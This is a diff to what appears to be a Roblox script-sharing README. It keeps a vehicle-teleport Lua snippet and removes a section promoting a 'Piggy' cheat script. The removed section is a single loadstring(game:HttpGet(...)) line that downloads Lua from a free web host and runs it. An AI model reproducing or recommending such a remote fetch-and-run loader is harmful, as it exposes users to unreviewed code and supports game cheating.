@@ -21,11 +21,5 @@ local VehicleName = car
    workspace.Vehicles[VehicleName].PrimaryPart = workspace.Vehicles[VehicleName].Seat
    workspace.Vehicles[VehicleName]:SetPrimaryPartCFrame(place)
 ```
-### Baconator V2 | Piggy Script!!!
-Another one of my favorite scripts is Baconator! It is a great Piggy script that is constantly being updated!
-
-```LUA
-loadstring(game:HttpGet("https://luawhitelistcheck.000webhostapp.com/BaconatorV2.lua"))()
-```
 
 My [Youtube Channel](https://www.youtube.com/channel/UCRfSrYi47Y7kRdoq2G1UHFA?view_as=subscriber) is a place where you can find some of my latest scripts and can become a beta tester!
